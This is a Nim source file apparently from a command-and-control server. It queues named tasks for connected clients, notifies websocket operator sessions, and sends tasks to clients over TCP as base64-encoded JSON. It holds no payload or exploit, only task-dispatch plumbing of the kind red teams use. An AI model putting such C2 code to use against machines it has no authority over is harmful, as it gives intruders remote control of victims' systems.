import asyncdispatch, asyncnet, base64, json, ws, json

import types, logging

proc sendClientTask*(client: C2Client, taskName: string, jData: JsonNode = nil): Future[Task] {.async.} =
  if not client.connected:
    errorLog "can't send task to disconnected client: " & $client
    return
  var data: JsonNode
  if jData.isNil:
    data = %*{}
  else: 
    data = jData

  let createdTask = Task(
    client: client,
    id: len(client.server.tasks),
    action: taskName,
    status: TaskNotCompleted,
    arguments: data,
    future: new (ref Future[void]),
    output: %*{}
  )

  client.server.tasks.add(createdTask)

  let pl = %*
    {
      "task": taskName,
      "taskId": createdTask.id,
      "data": data
    }

  for wsConnection in client.server.wsConnections:
    discard wsConnection.send($(%*{
      "event": "newtask",
      "data": %createdTask
    }))

  if client.listenerType == "tcp":
    let tcpSocket: TCPSocket = client.getTcpSocket()
    await tcpSocket.socket.send(encode($pl) & "\r\n")
  
  return createdTask

proc awaitResponse*(task: Task) {.async.} =
  if task.future[].isNil():
    task.future[] = newFuture[void]()
  await task.future[]

proc askToIdentify*(client: C2Client) {.async.} =
  discard await client.sendClientTask("identify")
